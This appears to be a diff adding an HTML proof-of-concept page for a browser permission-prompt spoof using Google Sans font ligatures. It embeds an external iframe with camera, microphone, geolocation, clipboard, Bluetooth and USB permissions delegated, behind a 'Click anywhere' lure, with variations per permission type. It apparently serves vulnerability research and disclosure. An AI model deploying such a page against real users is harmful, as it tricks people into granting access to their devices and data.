@@ -1,0 +1,58 @@
+<!doctype html>
+<html>
+<head>
+<style>
+html, body {
+    font-family: sans-serif;
+    overflow: hidden;
+}
+#instructions { text-align: center; margin-top: 100px; font-size: 2em; user-select: none; }
+#frame {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100vw;
+    height: 92vh;
+    z-index: 1;
+    border: 0;
+}
+#variations {
+    padding: 0.5em;
+    border-radius: 8px;
+    position: relative;
+    z-index: 2;
+    width: fit-content;
+    border: 1px solid #999;
+}
+</style>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+<body>
+<h1>PoC: Permission prompt spoof with Google Sans ligatures</h1>
+<div id="variations">Variations:
+<ul>
+    <li><a href="?mode=camera">Camera</a> (default)</li>
+    <li><a href="?mode=microphone">Microphone</a></li>
+    <li><a href="?mode=location">Location</a></li>
+    <li><a href="?mode=notification">Notification</a></li>
+    <li><a href="?mode=clipboard">Read clipboard</a></li>
+    <li><a href="?mode=bluetooth">Bluetooth</a></li>
+    <li><a href="?mode=usb">USB</a></li>
+    <li><a href="?mode=contacts">Contacts</a></li>
+</ul>
+</div>
+<p id="instructions">Click anywhere</p>
+</p>
+<iframe id="frame"
+    allow="camera *; microphone *; geolocation *; clipboard-read *; bluetooth *; usb *; midi *;"
+    ></iframe>
+<script>
+var searchParams = new URLSearchParams(window.location.search);
+var mode = searchParams.get('mode');
+var debug = searchParams.get('debug') == '1';
+
+frame.src = 'https://googlelogoligature.com/chromium/ndevtk/ligatures-perm-frame.html?mode='+mode
+
+</script>
+</body>
+</html>
